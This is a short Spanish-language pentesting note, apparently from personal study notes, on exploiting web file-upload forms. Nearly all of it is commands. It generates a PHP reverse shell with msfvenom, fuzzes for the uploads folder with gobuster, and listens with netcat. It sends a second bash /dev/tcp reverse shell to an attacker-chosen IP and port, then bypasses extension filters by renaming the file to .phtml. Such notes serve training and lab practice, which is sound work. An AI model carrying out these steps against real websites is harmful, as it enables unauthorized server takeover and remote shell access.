
Cuandouna web nos permite subir archivos hay que explotarlo bien, porque seguramente se pueda hacer una intrusión por ahí.
La forma de atacar será subir un archivo con un codigo malicioso que se puede crear con msfvenom



1 con Msfvenom generamos un payuload:
```sh fold:"Generar payload con msfvenom"
msfvenom -p php/reverse_php Lhost={IPlocal} LPORT={Local port} -f raw > pwned.php
```



Este archivo lo subimos con el formuulario de la web encontrado

Ahora tenemos que saber donde se ha subido para intentar ejecutarlo y ejecutar el codigo malicioso.

por tanto hacemos  Fuzzing con gobuster


```sh fold:"Buscar el fichero subido pwned.php con gobuster"
gobuster dir -u http://{ip} -w /usr/share/wordlist/dirbuster/directory-listls-lowercase-2.3-medium.txt
```


Si encontramos la carpeta /uploads o carpeta similares entramos
Una vez localizado nuestro fichero pwned.php solo nos falta

```sh fold:"Poner Netcat a la escucha en el puerto seleccionado en el fichero creado con msfvenom"
nc -nlvp {Local port}
```

Despues hacemos click sobre nuestro fichero para obtener la conexion en netcat


**Nota:** El payload con msfvenom funciona mal y al cabo del rato perdemos la conexion, por tatno lo primero que hacemos cuando hemos establacido conexion será abrir un nuevo terminal
con netcat nos ponemos a la escucha en otro puerto diferente al que hemos elegido previamente
y desde la conexion anterior nos enbviamos la reverse_shell:


```sh fold:"Enviar una conexion a nuestra maquina por el nuevo puerto"
bash -c "sh -i >&  /dev/tcp/{ip maquina local}/{nuevopuerto} 0>&1"
```


# Bypass Restriccion de FileUpload (Subir ficheros sin permiso de ficheros para ese formato)

cuando intentas subir un archivo en .php por ejemplo y no está permitido tenemos que Bypassear la restricción.

Intentamnos subir un fichero con extension .phtml
seria el mismo que en php pero cambiando directamente con un 

```sh fold:"Cambiar la extension de un fichero"
mv pwned.php pwned.phtml
```










